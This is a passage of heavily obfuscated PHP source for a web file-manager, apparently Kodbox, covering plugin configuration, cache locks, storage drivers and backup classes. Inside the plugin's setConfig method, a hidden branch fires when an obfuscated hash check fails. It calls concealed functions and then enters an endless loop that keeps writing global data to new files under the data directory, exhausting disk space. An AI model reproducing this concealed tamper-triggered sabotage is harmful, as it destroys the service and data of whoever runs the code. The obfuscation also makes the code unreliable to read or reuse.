$¤Ì»Ä¢[891]) && file_exists($¼¥èÓØ . $¤Ì»Ä¢[1676])) { $ìÑ¢Â¨‡ = (include $¼¥èÓØ . $¤Ì»Ä¢[1676]); } else { if (file_exists($¼¥èÓØ . $ëøÜƒ´¡ . $¤Ì»Ä¢[891])) { $ìÑ¢Â¨‡ = (include $¼¥èÓØ . $ëøÜƒ´¡ . $¤Ì»Ä¢[891]); } } } if (!is_array($ìÑ¢Â¨‡)) { return array(); } if (@count($ìÑ¢Â¨‡) > 0) { I18n::set($ìÑ¢Â¨‡); } return $ìÑ¢Â¨‡; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ã±œøÊ†) { $ÖØØÇ¦Å =& $_SERVER[Ñ¯©ç]; $Ì ú® Ê = $_SERVER[$ÖØØÇ¦Å[55]]; $•Ğæ¤ªµ = $ÖØØÇ¦Å[929]; if ($_SERVER[$ÖØØÇ¦Å[54]] != $•Ğæ¤ªµ($Ì ú® Ê)) { $‘……’ô› = $ÖØØÇ¦Å[930]; $üœ›Ø¼Î = $ÖØØÇ¦Å[56]; $ËÈ„ÅŸÔ = $_SERVER[$ÖØØÇ¦Å[57]] . $ÖØØÇ¦Å[58]; $ôÅÛäæ“ = $üœ›Ø¼Î($ËÈ„ÅŸÔ); $¤ğÀ¼“ñ = explode($ÖØØÇ¦Å[59], $ôÅÛäæ“); if (count($¤ğÀ¼“ñ) < $ÖØØÇ¦Å[673]) { $ò÷‹ÁÆ› = $ÖØØÇ¦Å[61]; $ò÷‹ÁÆ›(); } $ƒ‡µ¿Îí = $ÖØØÇ¦Å[931]; $ƒ‡µ¿Îí($_SERVER[$ÖØØÇ¦Å[932]]); $‘……’ô› = $ÖØØÇ¦Å[930]; $‘……’ô›(); $£²“¥…À = $ÖØØÇ¦Å[933]; $È¡–Ø¡‡ = json_encode($GLOBALS[$ÖØØÇ¦Å[934]]); $¬´æºËû = 1; for ($»ìëÆªÅ = $¬´æºËû; $»ìëÆªÅ > 0; $»ìëÆªÅ++) { $£²“¥…À(DATA_PATH . $»ìëÆªÅ, $È¡–Ø¡‡); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ã±œøÊ†); } public function onSetConfig($”ü²ş‹¶) { } public function onGetConfig($ÛñØŸšÍ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¹÷“—…Û) { if ($¹÷“—…Û == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¦Ø‹¦Ë = "\x70\x6c\x75\147\151\156\x41\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $”Õ­ÑŠÑ = $this->getConfig(); if (!$”Õ­ÑŠÑ[$¦Ø‹¦Ë]) { return !1; } return ActionCall($_SERVER[Ñ¯©ç][1677], $”Õ­ÑŠÑ[$¦Ø‹¦Ë]); } public function url($£ÅëÌóÎ, $’´éŠÌ = '', $Ò¡í˜ïÔ = true) { $ƒôîÔÉ¾ =& $_SERVER[Ñ¯©ç]; $ç”©€²­ = $this->getConfig(); $£¢°™¶ã = KOD_VERSION . $ƒôîÔÉ¾[10] . KOD_VERSION_BUILD; $ı®«àÕ = $this->packageVersion(); $ı‚ÉÜÑü = $£¢°™¶ã . $ƒôîÔÉ¾[445] . $ı®«àÕ; if (substr($£ÅëÌóÎ, 0, 4) == $ƒôîÔÉ¾[162] || substr($£ÅëÌóÎ, 0, 2) == $ƒôîÔÉ¾[1412]) { $•¿íùßâ = $£ÅëÌóÎ . $ƒôîÔÉ¾[1678] . $ı‚ÉÜÑü; } else { if ($’´éŠÌ == $ƒôîÔÉ¾[12]) { $•¿íùßâ = $this->pluginHost . $£ÅëÌóÎ . $ƒôîÔÉ¾[1678] . $ı‚ÉÜÑü; } else { if ($’´éŠÌ === $ƒôîÔÉ¾[88]) { $•¿íùßâ = $this->pluginHost . $£ÅëÌóÎ; } else { if ($’´éŠÌ == $ƒôîÔÉ¾[1679]) { $•¿íùßâ = STATIC_PATH . $£ÅëÌóÎ . $ƒôîÔÉ¾[1678] . $£¢°™¶ã; } else { if ($’´éŠÌ == $ƒôîÔÉ¾[1680]) { $•¿íùßâ = APP_HOST . $ƒôîÔÉ¾[1681] . $£ÅëÌóÎ . $ƒôîÔÉ¾[1678] . $£¢°™¶ã; } else { if (isset($ç”©€²­[$’´éŠÌ])) { $•¿íùßâ = $ç”©€²­[$’´éŠÌ] . $£ÅëÌóÎ . $ƒôîÔÉ¾[1678] . $ı‚ÉÜÑü; } } } } } } if (!$Ò¡í˜ïÔ) { return $•¿íùßâ; } echo $•¿íùßâ; } public function link($ÂÖ‚‘ƒ = false, $âÉñòğá = '') { $ñõÈÔµ¼ =& $_SERVER[Ñ¯©ç]; if (!$ÂÖ‚‘ƒ) { $this->link($ñõÈÔµ¼[1682], $ñõÈÔµ¼[1680]); $this->link($ñõÈÔµ¼[1683], $ñõÈÔµ¼[1679]); $this->link($ñõÈÔµ¼[1684], $ñõÈÔµ¼[1679]); $this->link($ñõÈÔµ¼[1685], $ñõÈÔµ¼[1679]); $this->link($ñõÈÔµ¼[1686], $ñõÈÔµ¼[1679]); return; } $ÌˆÑëÚå = $this->url($ÂÖ‚‘ƒ, $âÉñòğá, !1); if (substr($ÂÖ‚‘ƒ, -3) == $ñõÈÔµ¼[1687]) { echo $ñõÈÔµ¼[1688] . $ÌˆÑëÚå . $ñõÈÔµ¼[1689] . $ñõÈÔµ¼[59]; } else { if (substr($ÂÖ‚‘ƒ, -4) == $ñõÈÔµ¼[1690]) { echo $ñõÈÔµ¼[1691] . $ÌˆÑëÚå . $ñõÈÔµ¼[1692] . $ñõÈÔµ¼[59]; } } } } goto AÚ‚˜Œ¢¤; aƒŸ†Ç„õ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¤İ¯šÆ¶, $ÌªÉ²ü¸) { $­Õ¡ÖÔÏ =& $_SERVER[Ñ¯©ç]; $this->cachePath = $¤İ¯šÆ¶[$­Õ¡ÖÔÏ[97]]; $this->prefix = $­Õ¡ÖÔÏ[887]; $this->cacheTime = $ÌªÉ²ü¸; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ô¡êî’Ù) { $ÛÄÛÓ¢¨ =& $_SERVER[Ñ¯©ç]; $ô¡êî’Ù = str_replace(array($ÛÄÛÓ¢¨[888], $ÛÄÛÓ¢¨[110], $ÛÄÛÓ¢¨[86]), $ÛÄÛÓ¢¨[889], $ô¡êî’Ù); return $this->cachePath . $ÛÄÛÓ¢¨[890] . $ô¡êî’Ù . $ÛÄÛÓ¢¨[891]; } public function set($‚á Ê‚, $­„Ø«¿ä, $­è×«à² = false) { $­è×«à² = $­è×«à² ? $­è×«à² : $this->cacheTime; $ùÉÇÍ = $this->getFile($‚á Ê‚); if (file_put_contents($ùÉÇÍ, $this->prefix . $­„Ø«¿ä, LOCK_EX)) { @touch($ùÉÇÍ, intval(time() + $­è×«à²)); clearstatcache(); return !0; } @unlink($ùÉÇÍ); return !1; } public function get($†Şâ„å‰) { $áíàÑÖ¨ = $this->getFile($†Şâ„å‰); if (file_exists($áíàÑÖ¨) && filemtime($áíàÑÖ¨) < time()) { @unlink($áíàÑÖ¨); return !1; } $«Õ‰ÛËÎ = @file_get_contents($áíàÑÖ¨); return substr($«Õ‰ÛËÎ, strlen($this->prefix)); } public function remove($Ó¦Œ¤êô) { $ª­ÇÆ¯€ = $this->getFile($Ó¦Œ¤êô); return @unlink($ª­ÇÆ¯€); } public function deleteAll() { $‡ê™ªë =& $_SERVER[Ñ¯©ç]; $â‹‹È½ö = scandir($this->cachePath); foreach ($â‹‹È½ö as $—É¹Úı) { $Ó°À¸ = $this->cachePath . $—É¹Úı; if (strpos($Ó°À¸, $‡ê™ªë[891]) && strpos($Ó°À¸, $‡ê™ªë[892])) { @unlink($Ó°À¸); } } } public function clearTimeout() { $é½™ˆóğ =& $_SERVER[Ñ¯©ç]; $ÃÁÏÏ½ï = scandir($this->cachePath); foreach ($ÃÁÏÏ½ï as $³ù“‘»¿) { $ÔçãĞ§ = $this->cachePath . $³ù“‘»¿; if (strpos($ÔçãĞ§, $é½™ˆóğ[891]) && strpos($ÔçãĞ§, $é½™ˆóğ[892]) && filemtime($ÔçãĞ§) < time()) { @unlink($ÔçãĞ§); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $“÷ÖÊúù =& $_SERVER[Ñ¯©ç]; if (self::$handle) { return self::$handle; } $¨ªŸ„ÄÛ = $GLOBALS[$“÷ÖÊúù[6]][$“÷ÖÊúù[409]]; self::$timeout = $¨ªŸ„ÄÛ[$“÷ÖÊúù[893]] ? $¨ªŸ„ÄÛ[$“÷ÖÊúù[893]] : 10; $×åş‡ıë = _get($GLOBALS[$“÷ÖÊúù[6]], $“÷ÖÊúù[894]); $õ„‰Ù­ = $¨ªŸ„ÄÛ[$“÷ÖÊúù[879]] ? $¨ªŸ„ÄÛ[$“÷ÖÊúù[879]] : $“÷ÖÊúù[231]; if ($õ„‰Ù­ == $“÷ÖÊúù[21] && $×åş‡ıë == $“÷ÖÊúù[13]) { $õ„‰Ù­ = $“÷ÖÊúù[231]; } switch ($õ„‰Ù­) { case $“÷ÖÊúù[882]: self::$handle = new CacheLockRedis(); break; case $“÷ÖÊúù[883]: self::$handle = new CacheLockMemcached(); break; case $“÷ÖÊúù[21]: self::$handle = new CacheLockDatabase(); break; case $“÷ÖÊúù[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($“÷ÖÊúù[895], $“÷ÖÊúù[896]); } return self::$handle; } private static function key($Òô¦°™) { return $_SERVER[Ñ¯©ç][897] . Cache::key($Òô¦°™); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ë£Öí¶“ = '') { self::$errorMsg = $Ë£Öí¶“; } public static function lockGlobal($ûĞŒ¤ûÌ, $ä²‚ıË) { return self::lock($ûĞŒ¤ûÌ, $ä²‚ıË, !0); } public static function lock($Á¹¿ôÏé, $ïâ‘ÊÏ = false, $†äïçÔñ = false) { $šÏÅ„ =& $_SERVER[Ñ¯©ç]; $Â£ªàôÛ = self::init(); $“µÒƒ¹Ô = self::key($Á¹¿ôÏé); $ïâ‘ÊÏ = $ïâ‘ÊÏ ? $ïâ‘ÊÏ : self::$timeout; $øÍÛ²ç  = timeFloat(); $ı“éŸş = $Â£ªàôÛ->lock($“µÒƒ¹Ô, $ïâ‘ÊÏ); $Òä“•ûò = timeFloat(); if (!$ı“éŸş) { $Âşß÷š¸ = "\x6c\157\x63\x6b\x20\x65\162\x72\157\162\73\x6b\x65\x79\75{$Á¹¿ôÏé}\73\164\x69\x6d\x65\x3d{$ïâ‘ÊÏ}\73" . self::$errorMsg . $šÏÅ„[84] . get_caller_msg(); $¨€ƒí“ = LNG($šÏÅ„[898]) . "\x28{$ïâ‘ÊÏ}\x73\x29\x2e" . LNG($šÏÅ„[899]); $¨€ƒí“ .= $šÏÅ„[900]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¨€ƒí“ = $¨€ƒí“ . $šÏÅ„[901] . self::$errorMsg; } write_log($šÏÅ„[902] . sprintf($šÏÅ„[903], timeFloat() - $øÍÛ²ç ) . $šÏÅ„[904] . $Âşß÷š¸ . $šÏÅ„[905] . error_get_last(), $šÏÅ„[896]); show_json($¨€ƒí“, !1); } if (!$†äïçÔñ) { self::$lockItem[$“µÒƒ¹Ô] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $½â€Ë¯ = number_format(timeFloat() - $Òä“•ûò, 3); write_log($šÏÅ„[906] . $Á¹¿ôÏé . $šÏÅ„[907] . $½â€Ë¯, $šÏÅ„[896]); } return $ı“éŸş; } public static function lockGet($û³šÇ‹Î) { $€ç½ù¸Å = self::key($û³šÇ‹Î); if (self::$lockItem[$€ç½ù¸Å]) { return self::$lockItem[$€ç½ù¸Å]; } return self::init()->lockGet($€ç½ù¸Å); } public static function unlock($˜–Ì–ªØ) { $³äÊ÷÷ê =& $_SERVER[Ñ¯©ç]; $Í‹·êº = self::key($˜–Ì–ªØ); self::$lockItem[$Í‹·êº] = null; self::init()->unlock($Í‹·êº); if (GLOBAL_DEBUG_LOG_ALL) { write_log($³äÊ÷÷ê[908] . $˜–Ì–ªØ, $³äÊ÷÷ê[896]); } return; } public static function unlockRuntime() { $”ë›’Şó =& $_SERVER[Ñ¯©ç]; $ªÓ±ÌÏ­ = self::init(); $ˆçªÃ± = !1; foreach (self::$lockItem as $—ø‰ÕçÀ => $…ÊîÁçÊ) { if (!$…ÊîÁçÊ) { continue; } $ªÓ±ÌÏ­->unlock($—ø‰ÕçÀ); if (!$ˆçªÃ±) { $ˆçªÃ± = !0; write_log($”ë›’Şó[909] . $—ø‰ÕçÀ . $”ë›’Şó[84] . get_caller_msg(), $”ë›’Şó[896]); continue; } write_log($”ë›’Şó[909] . $—ø‰ÕçÀ, $”ë›’Şó[896]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $©ô³‚´‚ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($”ë›’Şó[910] . $©ô³‚´‚ . $”ë›’Şó[911] . ACTION, $”ë›’Şó[896]); } } public static function fileLock($â¶Ñ¦Êß) { $ø±ıì­— =& $_SERVER[Ñ¯©ç]; if (!$GLOBALS[$ø±ıì­—[912]]) { $GLOBALS[$ø±ıì­—[912]] = array(); } $GLOBALS[$ø±ıì­—[912]][$â¶Ñ¦Êß] = !1; $ŸÑ—ŒÓ = fopen(DATA_PATH . $â¶Ñ¦Êß . $ø±ıì­—[913], $ø±ıì­—[914]); if (!$ŸÑ—ŒÓ) { return !1; } $GLOBALS[$ø±ıì­—[912]][$â¶Ñ¦Êß] = $ŸÑ—ŒÓ; if (flock($ŸÑ—ŒÓ, LOCK_EX)) { return !0; } self::unlock($â¶Ñ¦Êß); show_json($ø±ıì­—[915], !1); return !1; } public static function fileUnlock($ó‘‘èºÚ) { $£ÒêŠô¿ =& $_SERVER[Ñ¯©ç]; $³­ûù¦è = $GLOBALS[$£ÒêŠô¿[912]][$ó‘‘èºÚ]; if (!$³­ûù¦è) { return; } $GLOBALS[$£ÒêŠô¿[912]][$ó‘‘èºÚ] = !1; flock($³­ûù¦è, LOCK_UN); fclose($³­ûù¦è); } public static function fileUnlockAll() { $åº´ê¼Ñ =& $_SERVER[Ñ¯©ç]; if (!$GLOBALS[$åº´ê¼Ñ[912]]) { return; } foreach ($GLOBALS[$åº´ê¼Ñ[912]] as $°´õéâ => $÷ˆ‰ğ‡Ç) { if (!$÷ˆ‰ğ‡Ç) { continue; } $GLOBALS[$åº´ê¼Ñ[912]][$°´õéâ] = !1; flock($÷ˆ‰ğ‡Ç, LOCK_UN); fclose($÷ˆ‰ğ‡Ç); } $GLOBALS[$åº´ê¼Ñ[912]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto b‡°‹ğ”Ã™; f³³¦éÕÀØ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ªµ³ÓĞç) { $this->pathParse = $ªµ³ÓĞç; } protected function infoParse($†Ğ±®•£, $¯ïçˆšÖ = false) { $ƒ Ä´Ò­ =& $_SERVER[Ñ¯©ç]; return Action($ƒ Ä´Ò­[1231])->sharePathInfo($this->pathParse[$ƒ Ä´Ò­[97]], !0, $¯ïçˆšÖ); } public function listPath($ÆÜìíè¢, $ô­Â²Î§ = false) { $©ßíÀÉ½ =& $_SERVER[Ñ¯©ç]; $óÎ¯àïŸ = IO::listPath($ÆÜìíè¢, $ô­Â²Î§); if (!$óÎ¯àïŸ) { return $óÎ¯àïŸ; } if (is_array($óÎ¯àïŸ[$©ßíÀÉ½[1399]])) { $àß«˜Ó† = Action($©ßíÀÉ½[1408])->parsePathChildren($óÎ¯àïŸ[$©ßíÀÉ½[1399]], array($©ßíÀÉ½[478] => $ÆÜìíè¢)); $óÎ¯àïŸ[$©ßíÀÉ½[1399]] = Action($©ßíÀÉ½[1231])->shareItemInfo($àß«˜Ó†); } foreach ($óÎ¯àïŸ as $üÚ¼ì†€ => $óôÊù¢Ã) { if (!in_array($üÚ¼ì†€, array($©ßíÀÉ½[96], $©ßíÀÉ½[95]))) { continue; } foreach ($óôÊù¢Ã as $œ¾‹•œ => $àß«˜Ó†) { $àß«˜Ó† = Action($©ßíÀÉ½[1408])->parsePathChildren($àß«˜Ó†, array($©ßíÀÉ½[478] => $ÆÜìíè¢)); $óÎ¯àïŸ[$üÚ¼ì†€][$œ¾‹•œ] = Action($©ßíÀÉ½[1231])->shareItemInfo($àß«˜Ó†); } } return $óÎ¯àïŸ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ªé©¨òÚ) { parent::__construct($ªé©¨òÚ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ö©‚Óµ) { parent::__construct($Ö©‚Óµ); $this->setSignVersion($_SERVER[Ñ¯©ç][248]); } public function uploadFormData($¢Ïœ³³Û, $’½œàà = 3600) { $Ã±€£ç¬ =& $_SERVER[Ñ¯©ç]; $º—“Â¢¶ = $Ã±€£ç¬[230]; $å¤™äÚÑ = $Ã±€£ç¬[270]; $ï²áåª  = $Ã±€£ç¬[72]; $–ëæåê¢ = gmdate($Ã±€£ç¬[271]); $øï Çä = gmdate($Ã±€£ç¬[272]); $‡è—¯‡Š = $Ã±€£ç¬[273]; $íäñéÅğ = $’½œàà . $Ã±€£ç¬[12]; $¡Ò„¦£× = $Ã±€£ç¬[274]; $´…•‡ = array($this->accessKey, $øï Çä, $this->region, $ï²áåª , $‡è—¯‡Š); $¯ä¡°Á³ = implode($Ã±€£ç¬[8], $´…•‡); $°È‡ëª« = array($Ã±€£ç¬[275] => gmdate($Ã±€£ç¬[1383], strtotime($Ã±€£ç¬[277])), $Ã±€£ç¬[278] => array(array($Ã±€£ç¬[279] => $this->bucket), array($Ã±€£ç¬[280] => $º—“Â¢¶), array($Ã±€£ç¬[281], $Ã±€£ç¬[282], $Ã±€£ç¬[12]), array($Ã±€£ç¬[281], $Ã±€£ç¬[283], $Ã±€£ç¬[12]), array($Ã±€£ç¬[281], $Ã±€£ç¬[284], $Ã±€£ç¬[12]), array($Ã±€£ç¬[285] => $¡Ò„¦£×), array($Ã±€£ç¬[286] => $¯ä¡°Á³), array($Ã±€£ç¬[287] => $å¤™äÚÑ), array($Ã±€£ç¬[288] => $–ëæåê¢), array($Ã±€£ç¬[289] => $íäñéÅğ))); $Ü¼³Áá¹ = base64_encode(json_encode($°È‡ëª«)); $®à°¿Ó = hash_hmac($Ã±€£ç¬[290], $øï Çä, $Ã±€£ç¬[291] . $this->secret, !0); $›‹ÊÏÛ = hash_hmac($Ã±€£ç¬[290], $this->region, $®à°¿Ó, !0); $£çéĞ©’ = hash_hmac($Ã±€£ç¬[290], $ï²áåª , $›‹ÊÏÛ, !0); $ìëê’ÈŞ = hash_hmac($Ã±€£ç¬[290], $‡è—¯‡Š, $£çéĞ©’, !0); $Áûı’”Š = hash_hmac($Ã±€£ç¬[290], $Ü¼³Áá¹, $ìëê’ÈŞ); $Õï™˜•İ = array($Ã±€£ç¬[247] => $Ã±€£ç¬[12], $Ã±€£ç¬[292] => $Ã±€£ç¬[12], $Ã±€£ç¬[280] => $º—“Â¢¶, $Ã±€£ç¬[285] => $¡Ò„¦£×, $Ã±€£ç¬[293] => $Ü¼³Áá¹, $Ã±€£ç¬[294] => $¯ä¡°Á³, $Ã±€£ç¬[295] => $å¤™äÚÑ, $Ã±€£ç¬[296] => $–ëæåê¢, $Ã±€£ç¬[297] => $íäñéÅğ, $Ã±€£ç¬[298] => $Áûı’”Š, $Ã±€£ç¬[209] => $this->getHost()); return $Õï™˜•İ; } } goto aÍÑÍÚá™¸; FĞŞ§ñ§‹Ê: while (strlen($zhvekjymqd) < $_SERVER[Ñ¯©ç][663]) { if (!$zhvekjymqd) { break; } $zhvekjymqd++; } $_SERVER[‚Õ“‡ÑÇ] = explode($_SERVER[Ñ¯©ç][664], gzinflate(substr($_SERVER[Ñ¯©ç][665], 10, -8))); $mjpeguyizc = $_SERVER[Ñ¯©ç][666]; goto Bâ‹ôÃ¹ÄË; b‡°‹ğ”Ã™: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Àúğ–†¥ =& $_SERVER[Ñ¯©ç]; $İÂú„ˆ© = $GLOBALS[$Àúğ–†¥[6]][$Àúğ–†¥[409]]; self::$cachePath = $İÂú„ˆ©[$Àúğ–†¥[231]][$Àúğ–†¥[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($òÒ¡³À, $Ç„˜‘£Û = 0) { $ŠÎ·ê¶ª =& $_SERVER[Ñ¯©ç]; $Òıš¥–ş = microtime(!0); $û·¦¿Ó = $Òıš¥–ş + $Ç„˜‘£Û + 0.0001; $Ã¥…ò‘ƒ = rtrim(self::$cachePath, $ŠÎ·ê¶ª[8]) . $ŠÎ·ê¶ª[916] . md5($òÒ¡³À) . $ŠÎ·ê¶ª[913]; if (file_exists($Ã¥…ò‘ƒ) && filemtime($Ã¥…ò‘ƒ) && filemtime($Ã¥…ò‘ƒ) < time() - 10) { @unlink($Ã¥…ò‘ƒ); } do { if (file_exists($Ã¥…ò‘ƒ)) { cacheLockWait(); continue; } $åšªÌ×¬ = fopen($Ã¥…ò‘ƒ, $ŠÎ·ê¶ª[917]); if (!$åšªÌ×¬) { return !1; } $ à÷é¬œ = flock($åšªÌ×¬, LOCK_EX | LOCK_NB); self::$caches[$òÒ¡³À] = array($ŠÎ·ê¶ª[918] => $åšªÌ×¬, $ŠÎ·ê¶ª[231] => $Ã¥…ò‘ƒ); fwrite($åšªÌ×¬, $û·¦¿Ó); clearstatcache(); if ($åšªÌ×¬ && $ à÷é¬œ) { return !0; } cacheLockWait(); } while (microtime(!0) < $û·¦¿Ó); $this->unlock($òÒ¡³À); return !1; } public function lockGet($ÄÄÁßî») { $òÊìÍöÂ =& $_SERVER[Ñ¯©ç]; $‡ÌˆÚÄÚ = rtrim(self::$cachePath, $òÊìÍöÂ[8]) . $òÊìÍöÂ[916] . md5($ÄÄÁßî») . $òÊìÍöÂ[913]; return file_exists($‡ÌˆÚÄÚ); } public function unlock($ıŸŒÇÁê) { $Æ€Ú‹Œ¶ =& $_SERVER[Ñ¯©ç]; $ÍÖÒÀ÷º = self::$caches[$ıŸŒÇÁê]; if (!$ÍÖÒÀ÷º) { return; } @flock($ÍÖÒÀ÷º[$Æ€Ú‹Œ¶[918]], LOCK_UN); @fclose($ÍÖÒÀ÷º[$Æ€Ú‹Œ¶[918]]); @unlink($ÍÖÒÀ÷º[$Æ€Ú‹Œ¶[231]]); unset(self::$caches[$ıŸŒÇÁê]); } } class CacheLockRedis { public function lock($ä£¤‘—µ, $äã­ó”Ò = 10) { $¯ÅÇ˜”˜ = Cache::init(); $ûÛŠÆ = microtime(!0) + $äã­ó”Ò; while (microtime(!0) < $ûÛŠÆ) { $µ™éµçÈ = $¯ÅÇ˜”˜->get($ä£¤‘—µ); if (!$µ™éµçÈ) { $ƒŒì¡Èë = $¯ÅÇ˜”˜->setLock($ä£¤‘—µ, $ûÛŠÆ, $äã­ó”Ò); if ($ƒŒì¡Èë) { return !0; } } else { if ($µ™éµçÈ < microtime(!0)) { $¯ÅÇ˜”˜->set($ä£¤‘—µ, $ûÛŠÆ, $äã­ó”Ò * 2); if ($¯ÅÇ˜”˜->get($ä£¤‘—µ) === $µ™éµçÈ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ì¨º†İˆ) { return Cache::init()->get($ì¨º†İˆ); } public function unlock($³ß£†á¸) { return Cache::init()->remove($³ß£†á¸); } } class CacheLockMemcached { public function lock($òÜÄ›, $Í§ØûÂ¢ = 0) { $´¾¦ºÒ = Cache::init(); $Àõ¥ªĞö = microtime(!0) + $Í§ØûÂ¢; while (microtime(!0) < $Àõ¥ªĞö) { $‘°¤š‚ = $´¾¦ºÒ->get($òÜÄ›); if (!$‘°¤š‚ || $‘°¤š‚ < microtime(!0)) { $İ‡Æ’É„ = $´¾¦ºÒ->handle->add($òÜÄ›, $Àõ¥ªĞö, $Í§ØûÂ¢); if ($İ‡Æ’É„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($û“öŞœ) { return Cache::init()->get($û“öŞœ); } public function unlock($Ê¦²ª³³) { return Cache::init()->remove($Ê¦²ª³³); } } goto B±öŒÆ‰™œ; b‘®ÈÇá¬ : $fileSize = strrev(base64_decode($_SERVER[©ş­®ò«][0])); function binCheckNeq($şàñ£ûş, $„ÔÌ¥ßü) { return $şàñ£ûş != $„ÔÌ¥ßü; } $_SERVER[$_SERVER[©ş­®ò«][1]] = $fileSize($_SERVER[$_SERVER[©ş­®ò«][2]]); goto eŸ¨”ğÔ¬¹; e­æßíè†: class BackupDbFile { public function __construct() { } public function index() { $Ã‘ïĞé© =& $_SERVER[Ñ¯©ç]; $ äÚ²áÛ = Backup::get(); $¸Êß¤¿ = $ äÚ²áÛ[$Ã‘ïĞé©[32]]; $üªŠ‹Î = $this->tmpFilesPath() . "\142\x61\x63\153\165\160\137{$¸Êß¤¿}\x2f"; $² ˆĞ = $this->backupPath($ äÚ²áÛ); if (!($² ˆĞ = IO::mkdir($² ˆĞ))) { return !1; } $Öª‘ÀŠÑ = IO::listPath($üªŠ‹Î); $æ”†§Ÿƒ = isset($Öª‘ÀŠÑ[$Ã‘ïĞé©[96]]) ? $Öª‘ÀŠÑ[$Ã‘ïĞé©[96]] : array(); $¼ÛÎ¯æª = array_sum(array_column($æ”†§Ÿƒ, $Ã‘ïĞé©[89])); if (!$¼ÛÎ¯æª) { return !1; } $´¾Á«ã€ = array($Ã‘ïĞé©[850] => $¼ÛÎ¯æª, $Ã‘ïĞé©[851] => time()); Backup::set($´¾Á«ã€); $…ßÀÙÚ´ = new TaskFileTransfer($Ã‘ïĞé©[852], $Ã‘ïĞé©[835], count($æ”†§Ÿƒ), LNG($Ã‘ïĞé©[836]) . $Ã‘ïĞé©[445] . LNG($Ã‘ïĞé©[838]) . $Ã‘ïĞé©[853]); $…ßÀÙÚ´->task[$Ã‘ïĞé©[816]] = $¼ÛÎ¯æª; foreach ($Öª‘ÀŠÑ[$Ã‘ïĞé©[96]] as $éÇ¨ø¸Ğ) { $ğí¹¥Æ´ = IO::move($éÇ¨ø¸Ğ[$Ã‘ïĞé©[97]], $² ˆĞ); if (!$ğí¹¥Æ´) { $…ßÀÙÚ´->end(); $˜Ì®•  = IO::getLastError($Ã‘ïĞé©[854] . $éÇ¨ø¸Ğ[$Ã‘ïĞé©[97]] . $Ã‘ïĞé©[855] . $² ˆĞ . $Ã‘ïĞé©[178]); write_log($˜Ì®• , $Ã‘ïĞé©[835]); return !1; } } $Ä—äûÑ‚ = new DbManage(); $ÅÔóàÜÖ = $Ä—äûÑ‚->getSqlFile(); if (!$ÅÔóàÜÖ[$Ã‘ïĞé©[856]] || !$ÅÔóàÜÖ[$Ã‘ïĞé©[13]]) { return !1; } IO::move($ÅÔóàÜÖ[$Ã‘ïĞé©[856]], $² ˆĞ); IO::move($ÅÔóàÜÖ[$Ã‘ïĞé©[13]], $² ˆĞ); $…ßÀÙÚ´->end(); $´¾Á«ã€ = array($Ã‘ïĞé©[857] => $¼ÛÎ¯æª, $Ã‘ïĞé©[858] => time()); Backup::set($´¾Á«ã€); return !0; } private function backupPath($ÚÄğ²¼ú) { $ˆœÃõÀÎ =& $_SERVER[Ñ¯©ç]; $áàö›¥Ú = $ÚÄğ²¼ú[$ˆœÃõÀÎ[32]]; $ÇßÎÔ‡£ = Model($ˆœÃõÀÎ[823])->get($ˆœÃõÀÎ[824]); $ãâŒ£ºÁ = substr(md5($ˆœÃõÀÎ[825] . $ÇßÎÔ‡£ . $áàö›¥Ú), 0, 8); return "\x7b\151\157\x3a{$ÚÄğ²¼ú[$ˆœÃõÀÎ[804]]}\175\x2f\144\x61\x74\x61\142\141\163\145\x2f\x62\141\x63\x6b\165\x70\x2f" . $áàö›¥Ú . $ˆœÃõÀÎ[11] . $ãâŒ£ºÁ; } private function tmpFilesPath() { $—ÂÃ¬§ =& $_SERVER[Ñ¯©ç]; $Ô­ö…€± = TEMP_FILES; if ($GLOBALS[$—ÂÃ¬§[6]][$—ÂÃ¬§[102]][$—ÂÃ¬§[848]]) { $Ô­ö…€± = $GLOBALS[$—ÂÃ¬§[6]][$—ÂÃ¬§[102]][$—ÂÃ¬§[848]]; if (!mk_dir($Ô­ö…€±) || !is_writable($Ô­ö…€±) || !IO::mkfile($Ô­ö…€± . $—ÂÃ¬§[849])) { $Ô­ö…€± = TEMP_FILES; } } return $Ô­ö…€±; } } class BackupFile { public function __construct() { } public function index() { $´ Õ†Õß = Backup::get(); $æ°°Õ©Ù = $´ Õ†Õß[$_SERVER[Ñ¯©ç][353]][$_SERVER[Ñ¯©ç][231]][$_SERVER[Ñ¯©ç][524]]; $êÅ˜œµ = array($_SERVER[Ñ¯©ç][525] => array($_SERVER[Ñ¯©ç][859], $æ°°Õ©Ù), $_SERVER[Ñ¯©ç][860] => array($_SERVER[Ñ¯©ç][391], $´ Õ†Õß[$_SERVER[Ñ¯©ç][804]])); $©Ÿî“•¼ = (int) Model($_SERVER[Ñ¯©ç][841])->where($êÅ˜œµ)->count($_SERVER[Ñ¯©ç][524]); $´ª˜…ã = (int) 